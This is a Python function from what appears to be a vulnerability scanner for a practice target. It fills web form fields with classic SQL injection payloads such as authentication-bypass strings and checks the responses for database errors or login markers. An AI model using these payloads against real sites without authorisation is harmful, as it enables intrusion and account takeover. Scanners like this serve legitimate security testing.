import requests

def scan_sqli(form, target_url):
    """
    Test a form for basic SQL Injection vulnerabilities.
    """
    payloads = ["'", "''", "' OR '1'='1", "' OR 1=1--", '" OR 1=1--', "admin' --"]
    vulnerabilities = []

    action = form.get("action")
    method = form.get("method", "get").lower()
    inputs = form.get("inputs", [])

    for payload in payloads:
        data = {}
        for input_field in inputs:
            if input_field["type"] != "submit":
                data[input_field["name"]] = payload
            else:
                data[input_field["name"]] = input_field["value"]

        try:
            if method == "post":
                response = requests.post(action, data=data, timeout=5)
            else:
                response = requests.get(action, params=data, timeout=5)

            # Look for common SQL error messages or successful bypass indicators
            error_indicators = [
                "sqlite3.OperationalError",
                "SQL syntax",
                "mysql_fetch_array",
                "PostgreSQL query failed",
                "Welcome, admin", # Specific to our vulnerable app
                "THIS_IS_THE_FLAG_SQLI"
            ]

            for indicator in error_indicators:
                if indicator in response.text:
                    vulnerabilities.append({
                        "type": "SQL Injection",
                        "severity": "CRITICAL",
                        "url": action,
                        "payload": payload,
                        "description": f"Potential SQL Injection detected via form at {action} using payload {payload}.",
                        "evidence": indicator
                    })
                    return vulnerabilities # Found one, move to next form
        except Exception as e:
            print(f"SQLi Test Error: {e}")

    return vulnerabilities
